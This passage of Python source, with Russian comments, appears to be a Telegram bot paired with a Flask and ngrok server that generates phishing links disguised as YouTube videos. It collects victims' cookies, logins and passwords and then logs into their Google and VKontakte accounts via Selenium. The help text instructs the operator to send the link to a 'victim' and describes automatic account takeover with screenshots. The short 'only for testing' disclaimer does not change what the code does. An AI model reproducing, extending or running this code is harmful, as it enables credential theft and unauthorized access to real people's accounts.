                result = auto_login_manager.login_with_credentials("google", email, password)
                results.append(result)
                
                if result.get("logged_in"):
                    await status_msg.edit_text(f"✅ *Успешный вход в Google!*\n\nАккаунт: `{email}`")
                    
                    # Отправляем скриншот
                    if result.get("screenshot") and os.path.exists(result["screenshot"]):
                        try:
                            with open(result["screenshot"], 'rb') as photo:
                                await context.bot.send_photo(
                                    chat_id=update.effective_user.id,
                                    photo=photo,
                                    caption=f"📸 Успешный вход в Google"
                                )
                        except:
                            pass
                    break
    
    # Пробуем ВКонтакте
    for login in link.collected_logins:
        email = login.get('value', '')
        if '@' in email and ('@mail.ru' in email or '@yandex.ru' in email or '@vk.com' in email):
            password = None
            for pwd in link.collected_passwords:
                if len(pwd.get('value', '')) > 6:
                    password = pwd.get('value')
                    break
            
            if password:
                await status_msg.edit_text(f"🔐 *Пытаюсь войти в ВКонтакте...*")
                
                result = auto_login_manager.login_with_credentials("vk", email, password)
                results.append(result)
                
                if result.get("logged_in"):
                    await status_msg.edit_text(f"✅ *Успешный вход в ВКонтакте!*")
                    
                    if result.get("screenshot") and os.path.exists(result["screenshot"]):
                        try:
                            with open(result["screenshot"], 'rb') as photo:
                                await context.bot.send_photo(
                                    chat_id=update.effective_user.id,
                                    photo=photo,
                                    caption=f"📸 Успешный вход в ВКонтакте"
                                )
                        except:
                            pass
                    break
    
    # Закрываем драйвер
    auto_login_manager.close()
    
    # Формируем отчет
    successful = [r for r in results if r.get("logged_in")]
    
    report = f"""
🎯 *РЕЗУЛЬТАТЫ АВТОМАТИЧЕСКОГО ВХОДА*

📌 Ссылка: `{link_id}`
🎬 Видео: {link.video_id}
🕒 Время: {datetime.now().strftime('%H:%M:%S')}

📊 *Итого:*
• Всего попыток: {len(results)}
• Успешных входов: {len(successful)}
• Провалов: {len(results) - len(successful)}

"""
    
    if successful:
        report += "✅ *УСПЕШНЫЕ ВХОДЫ:*\n"
        for result in successful:
            report += f"• {result.get('service', 'unknown')}: {result.get('account', 'unknown')}\n"
    else:
        report += "❌ *Не удалось войти ни в один аккаунт*\n"
    
    report += """
💡 *Советы:*
1. Убедитесь что логины и пароли корректны
2. Попробуйте разные комбинации
3. Некоторые сервисы требуют двухфакторную аутентификацию
4. Используйте актуальные данные
"""
    
    await status_msg.edit_text(report, parse_mode=ParseMode.MARKDOWN)

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Статистика"""
    stats = db.stats
    
    message = f"""
📊 *СТАТИСТИКА СИСТЕМЫ*

🔗 Всего ссылок: `{stats['total_links']}`
👣 Всего переходов: `{stats['total_clicks']}`
🍪 Cookies собрано: `{stats['cookies_collected']}`
🔑 Паролей найдено: `{stats['passwords_collected']}`
👤 Логинов собрано: `{stats['logins_collected']}`

🌐 Домен: {DOMAIN}
🤖 Бот активен: Да
🚀 Ngrok: {"✅ Включен" if USE_NGROK else "❌ Выключен"}
"""
    
    await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик кнопок"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    if data == "create_link":
        await query.message.reply_text("📥 Отправьте ссылку на YouTube видео...")
    
    elif data == "stats":
        await stats_command(query, context)
    
    elif data == "my_links":
        user_links = [link for link in db.links.values() if link.created_by == query.from_user.id]
        
        if not user_links:
            await query.message.reply_text("📭 У вас нет ссылок.")
            return
        
        message = "📋 *ВАШИ ССЫЛКИ:*\n\n"
        for link in user_links[-5:]:
            message += f"• `{link.id}` - {link.video_id} ({link.clicks} переходов)\n"
        
        await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
    
    elif data == "auto_login":
        await auto_login_command(query, context)
    
    elif data.startswith("login_"):
        link_id = data[6:]
        await start_auto_login(query, context, link_id)
    
    elif data.startswith("data_"):
        link_id = data[5:]
        link = db.get_link(link_id)
        
        if link and link.created_by == query.from_user.id:
            message = f"📊 *ДАННЫЕ {link_id[:12]}*\n\n"
            message += f"Cookies: {len(link.collected_cookies)}\n"
            message += f"Пароли: {len(link.collected_passwords)}\n"
            message += f"Логины: {len(link.collected_logins)}\n\n"
            
            if link.collected_passwords:
                message += "🔑 *Пароли:*\n"
                for pwd in link.collected_passwords[-3:]:
                    message += f"• `{pwd.get('value', '')}`\n"
            
            await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
    
    elif data == "help":
        help_text = """
🆘 *ПОМОЩЬ*

🎯 *Как использовать:*
1. Создайте ссылку командой /link [youtube_url]
2. Получите фишинговую ссылку
3. Отправьте её жертве
4. Данные соберутся автоматически
5. Используйте /login для входа

🔐 *Что собирается:*
• Cookies и сессионные данные
• Логины и пароли из форм
• Данные браузера
• Информация об устройстве

🚀 *Автоматический вход:*
• Бот пытается войти в Google и ВКонтакте
• Использует собранные логины и пароли
• Делает скриншоты успешных входов
• Сохраняет cookies для будущего использования

⚠️ *Важно:*
• Используйте только для тестирования
• Все данные отправляются администратору
• Данные хранятся 24 часа
"""
        await query.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)

# ========== ЗАПУСК ==========

def run_flask():
    """Запуск Flask сервера"""
    port = 5000
    print(f"🌐 Запуск веб-сервера на порту {port}...")
    
    # Настраиваем ngrok если включен
    if USE_NGROK:
        public_url = setup_ngrok()
        if public_url:
            print(f"✅ Ngrok туннель: {public_url}")
            print(f"🌐 Ваш домен: {public_url}")
        else:
            print("⚠️ Ngrok не настроен, используйте localhost")
    
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)

def run_bot():
    """Запуск Telegram бота"""
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Регистрируем обработчики
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("link", create_link_command))
    application.add_handler(CommandHandler("data", show_data_command))
    application.add_handler(CommandHandler("login", auto_login_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CommandHandler("help", start_command))
    
    # Обработчик YouTube ссылок
    application.add_handler(MessageHandler(
        filters.TEXT & filters.Regex(r'(youtube\.com|youtu\.be)'),
        handle_youtube_link
    ))
    
    # Обработчик кнопок
    application.add_handler(CallbackQueryHandler(button_handler))
    
    print("🤖 Запуск Telegram бота...")
    print(f"👑 Админ ID: {ADMIN_ID}")
    print(f"🌐 Домен: {DOMAIN}")
    print("🚀 Бот готов к работе!")
    
    if not SELENIUM_AVAILABLE:
        print("⚠️ Selenium не установлен. Автоматический вход недоступен.")
        print("💡 Установите: pip install selenium webdriver-manager")
    
    application.run_polling(allowed_updates=Update.ALL_UPDATES)

def main():
    """Главная функция"""
    print("""
    ╔══════════════════════════════════════╗
    ║    🚀 YOUTUBE DATA COLLECTOR BOT    ║
    ║            v2.0 - NGrok             ║
    ╚══════════════════════════════════════╝
    """)
    
    # Проверяем токен бота
    if BOT_TOKEN == "ВАШ_ТОКЕН_БОТА":
        print("❌ ОШИБКА: Замените BOT_TOKEN в коде!")
        print("💡 Получите токен у @BotFather")
        return
    
    # Запускаем в двух потоках
    import threading
    
    # Поток для Flask
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    # Ждем запуска Flask
    time.sleep(3)
    
    # Запускаем бота
    run_bot()

if __name__ == '__main__':
    main()